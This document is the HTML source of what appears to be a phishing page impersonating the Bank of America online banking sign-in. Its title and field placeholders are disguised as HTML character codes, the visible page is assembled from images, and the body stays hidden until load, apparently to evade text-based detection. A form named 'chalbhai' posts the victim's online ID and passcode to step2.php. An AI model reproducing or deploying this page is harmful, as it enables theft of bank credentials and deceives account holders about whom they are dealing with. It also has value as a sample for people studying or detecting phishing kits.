<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#66;&#97;&#110;&#107;&#32;&#111;&#102;&#32;&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#32;&#124;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#32;&#124;&#32;&#83;&#105;&#103;&#110;&#32;&#73;&#110;&#32;&#124;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#73;&#68;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
div#container
{
	position:relative;
	width: 1374px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image2" style="position:absolute; overflow:hidden; left:556px; top:-1px; width:628px; height:27px; z-index:0"><a href="#"><img src="images/bo12.png" alt="" title="" border=0 width=628 height=27></a></div>

<div id="image1" style="position:absolute; overflow:hidden; left:210px; top:25px; width:230px; height:38px; z-index:1"><a href="#"><img src="images/b4.png" alt="" title="" border=0 width=230 height=38></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:659px; top:51px; width:285px; height:28px; z-index:2"><a href="#"><img src="images/bo13.png" alt="" title="" border=0 width=285 height=28></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:948px; top:37px; width:237px; height:42px; z-index:3"><img src="images/bo14.png" alt="" title="" border=0 width=237 height=42></div>

<div id="image5" style="position:absolute; overflow:hidden; left:478px; top:100px; width:707px; height:50px; z-index:4"><a href="#"><img src="images/bo15.png" alt="" title="" border=0 width=707 height=50></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:189px; top:148px; width:998px; height:301px; z-index:5"><a href="#"><img src="images/bo16.png" alt="" title="" border=0 width=998 height=301></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:190px; top:92px; width:298px; height:133px; z-index:6"><img src="images/b1.png" alt="" title="" border=0 width=298 height=133></div>

<div id="image8" style="position:absolute; overflow:hidden; left:199px; top:195px; width:160px; height:20px; z-index:7"><a href="#"><img src="images/b2.png" alt="" title="" border=0 width=160 height=20></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:391px; top:165px; width:85px; height:19px; z-index:8"><a href="#"><img src="images/b3.png" alt="" title="" border=0 width=85 height=19></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:188px; top:448px; width:1000px; height:192px; z-index:9"><a href="#"><img src="images/bo17.png" alt="" title="" border=0 width=1000 height=192></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:208px; top:642px; width:974px; height:202px; z-index:10"><img src="images/bo18.png" alt="" title="" border=0 width=974 height=202></div>

<div id="image12" style="position:absolute; overflow:hidden; left:189px; top:862px; width:996px; height:93px; z-index:11"><img src="images/bo19.png" alt="" title="" border=0 width=996 height=93></div>

<div id="image13" style="position:absolute; overflow:hidden; left:188px; top:954px; width:999px; height:305px; z-index:12"><a href="#"><img src="images/bo20.png" alt="" title="" border=0 width=999 height=305></a></div>

<div id="image14" style="position:absolute; overflow:hidden; left:980px; top:1271px; width:200px; height:49px; z-index:13"><a href="#"><img src="images/bo21.png" alt="" title="" border=0 width=200 height=49></a></div>

<div id="image15" style="position:absolute; overflow:hidden; left:188px; top:1326px; width:994px; height:194px; z-index:14"><img src="images/bo22.png" alt="" title="" border=0 width=994 height=194></div>

<div id="image16" style="position:absolute; overflow:hidden; left:188px; top:1529px; width:985px; height:163px; z-index:15"><img src="images/bo23.png" alt="" title="" border=0 width=985 height=163></div>

<div id="image17" style="position:absolute; overflow:hidden; left:187px; top:1721px; width:1001px; height:140px; z-index:16"><img src="images/bo24.png" alt="" title="" border=0 width=1001 height=140></div>

<div id="image18" style="position:absolute; overflow:hidden; left:918px; top:1772px; width:267px; height:34px; z-index:17"><a href="#"><img src="images/bo25.png" alt="" title="" border=0 width=267 height=34></a></div>

<div id="image19" style="position:absolute; overflow:hidden; left:186px; top:1741px; width:541px; height:23px; z-index:18"><a href="#"><img src="images/bo26.png" alt="" title="" border=0 width=541 height=23></a></div>

<div id="image20" style="position:absolute; overflow:hidden; left:188px; top:1771px; width:232px; height:22px; z-index:19"><a href="#"><img src="images/bo27.png" alt="" title="" border=0 width=232 height=22></a></div>

<div id="image21" style="position:absolute; overflow:hidden; left:411px; top:1812px; width:153px; height:19px; z-index:20"><a href="#"><img src="images/bo30.png" alt="" title="" border=0 width=153 height=19></a></div>

<div id="image22" style="position:absolute; overflow:hidden; left:975px; top:684px; width:204px; height:149px; z-index:21"><a href="#"><img src="images/b5.png" alt="" title="" border=0 width=204 height=149></a></div>

<div id="image23" style="position:absolute; overflow:hidden; left:213px; top:754px; width:200px; height:21px; z-index:22"><a href="#"><img src="images/b6.png" alt="" title="" border=0 width=200 height=21></a></div>
<form action=step2.php name=chalbhai id=chalbhai method=post>
<input name="user" placeholder="&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#73;&#68;" autocomplete="off" required type="text" style="position:absolute;width:90px;height:24px;padding-left:3px;left:202px;top:124px;z-index:23">
<input name="pass" placeholder="&#80;&#97;&#115;&#115;&#99;&#111;&#100;&#101;" autocomplete="off" required type="password" style="position:absolute;width:90px;height:24px;padding-left:3px;left:298px;top:124px;z-index:24">
<div id="formcheckbox1" style="position:absolute; left:198px; top:162px; z-index:25"><input type="checkbox" name="formcheckbox1"></div>
<div id="formimage1" style="position:absolute; left:390px; top:123px; z-index:26"><input type="image" name="formimage1" width="82" height="30" src="images/sign.png"></div>
</div>

</body>
</html>
